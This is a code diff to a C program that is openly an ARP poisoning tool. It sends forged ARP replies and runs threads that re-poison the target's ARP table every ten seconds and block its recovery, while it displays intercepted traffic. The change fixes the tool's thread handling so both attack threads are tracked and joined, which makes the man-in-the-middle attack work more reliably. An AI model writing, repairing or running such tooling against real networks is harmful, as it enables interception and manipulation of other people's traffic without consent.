@@ -87,7 +87,7 @@ int main(int argc, char *argv[])
 	MAKE_ARPREP_STRUCT(arp_reply2target, attacker_MAC_array, target_MAC_array, target_IP_int, sender_IP_int);
 	puts("[+] Built ARP packets\n");
 
-	pthread_t tid;
+	pthread_t tid1, tid2;
 
 	strcpy(info->dev, argv[1]);
 	info->sender_IP_int = sender_IP_int;
@@ -99,10 +99,10 @@ int main(int argc, char *argv[])
 	pcap_sendpacket(handle, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr)); puts("[  INIT  ] sender    attacker -> target"); puts("");
 
 // Extra level of assurance
-	pthread_create(&tid, NULL, SEND_ARP, (void *)info);
+	pthread_create(&tid1, NULL, SEND_ARP, (void *)info);
 	puts("[+] Initiated thread, periodically (10s) poisoning arp table\n");
 
-	pthread_create(&tid, NULL, BLOCK_RECOVERY, (void *)info);
+	pthread_create(&tid2, NULL, BLOCK_RECOVERY, (void *)info);
 	puts("[+] Initiated thread, blocking arp table recovery\n");
 	puts("[+] Displaying network traffic...\n");
 
@@ -177,7 +177,8 @@ int main(int argc, char *argv[])
 		free(n_packet);
 	}
 
-	pthread_join(tid, NULL);
+	pthread_join(tid1, NULL);
+	pthread_join(tid2, NULL);
 	
 	pcap_close(handle);
 	free(info);
